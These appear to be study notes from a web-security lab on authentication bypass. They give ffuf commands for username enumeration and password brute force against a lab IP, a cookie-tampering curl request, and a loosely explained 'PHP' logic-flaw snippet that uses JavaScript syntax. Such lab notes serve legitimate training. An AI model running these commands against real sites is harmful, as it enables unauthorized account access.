### **I. Username Enumeration**

- **Goal:** Discover valid usernames.
- **Methods:**
    - **Website Errors:** Analyze error messages for clues. _Example:_ "Username already exists."
    - **ffuf:** Fuzzing tool to check username wordlists.
        ```ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.180.138/customers/signup -mr "username already exists"```
        
        - `-w`: Wordlist location.
        - `-X`: Request method (POST).
        - `-d`: Request data (FUZZ keyword for wordlist insertion).
        - `-H`: Additional headers (Content-Type).
        - `-u`: URL.
        - `-mr`: Match regex (text to look for).
    - **Output Redirection:** `SomeCommand >> SomeFile.txt`
### **II. Brute Force**

- **Goal:** Guess passwords.
- **ffuf Example:**
    ```
    ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.180.138/customers/login -fc 200
    ```
    
    - `-w`: Multiple wordlists (usernames:W1, passwords:W2).
    - `-fc`: Filter by status code (exclude 200).
### **III. Logic Flaws**

- **Definition:** Bypassing security checks due to weaknesses in code logic.
- **Example (PHP):**
    ```
    if( url.substr(0,6) === '/admin') {
        # Code to check user is an admin
    } else {
        # View Page
    }
    ```
    
    - `===` (strict comparison) might be case-sensitive, allowing bypass with `/Admin` or `/aDmin`.
    ![[Pasted image 20241109152155.png]]
### **IV. Cookie Tampering**

- **Vulnerability:** Some cookies are stored in plain text.
- **Example (curl):**
    ```
    curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test
    ```
    
- **Other Cookie Issues:** Cookies might be hashed or base64 encoded, but still vulnerable if the hashing/encoding is weak.